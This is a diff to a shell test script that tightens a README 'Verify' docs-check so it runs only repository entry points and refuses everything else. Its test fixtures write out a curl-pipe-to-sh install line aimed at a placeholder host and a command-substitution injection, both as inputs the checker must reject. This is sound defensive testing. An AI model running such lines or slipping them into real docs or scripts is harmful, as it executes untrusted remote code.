@@ -690,12 +690,29 @@ git add src/infra/http/invoices.test.ts
 expect_ok "isolation guard passes once the 404 test is staged" bash scripts/check-isolation-tests.sh
 git reset -q && rm -rf src/infra/http
 
-echo "== docs-check (rule 12.1): the README Verify block runs, and a broken one fails =="
-printf '# fixture\n\n## Verify\n```bash\ntest -f package.json\n```\n' > README.md
-expect_ok "docs-check passes when the README Verify command works" bash scripts/check-docs.sh README.md
-printf '# fixture\n\n## Verify\n```bash\ntest -f a-path-the-readme-claims-but-is-gone.ts\n```\n' > README.md
-expect_err "docs-check fails when a documented command breaks" bash scripts/check-docs.sh README.md
-rm -f README.md
+echo "== docs-check (canon 12.1): the README Verify block runs repo entry points, and nothing else =="
+# Since 2026-09-26 the Verify block is never shell: a line runs only when it names an
+# entry point (a package script, a scripts/ file, a path check), as an argument list.
+# The old bash -c version ran every hostile block below, which is what the skills.sh
+# audits flagged.
+verify_readme() { { printf '# fixture\n\n## Verify\n```bash\n'; cat; printf '```\n'; } > README.md; }
+printf 'test -f package.json\nbash scripts/check-package-json.sh   # gate 2 is green here\nbun run typecheck\n' | verify_readme
+expect_ok "docs-check runs a Verify block of entry points (a path check, a scripts/ file, a package script)" bash scripts/check-docs.sh README.md
+printf 'test -f a-path-the-readme-claims-but-is-gone.ts\n' | verify_readme
+expect_err "docs-check fails when a documented path is gone" bash scripts/check-docs.sh README.md
+printf 'bun run a-script-that-was-renamed\n' | verify_readme
+expect_err "docs-check refuses a package script that no longer exists" bash scripts/check-docs.sh README.md
+printf 'bash scripts/not-there.sh\n' | verify_readme
+expect_err "docs-check refuses a scripts/ file that no longer exists" bash scripts/check-docs.sh README.md
+rm -f docs-check-ran
+printf 'curl -fsS https://example.invalid/install.sh | sh\n' | verify_readme
+expect_err "docs-check refuses a pipe: README text is never shell" bash scripts/check-docs.sh README.md
+printf 'test -f package.json\ntouch docs-check-ran\n' | verify_readme
+expect_err "docs-check refuses a command that is not an entry point" bash scripts/check-docs.sh README.md
+printf 'test -f $(touch docs-check-ran)\n' | verify_readme
+expect_err "docs-check refuses a command substitution" bash scripts/check-docs.sh README.md
+expect_err "and a refused block runs nothing (no docs-check-ran file)" test -e docs-check-ran
+rm -f README.md docs-check-ran
 
 echo "== staleness gate (a vendored standard is a dependency; references/governance.md) =="
 # Proven on the real skill tree: a vendored copy identical to upstream passes,
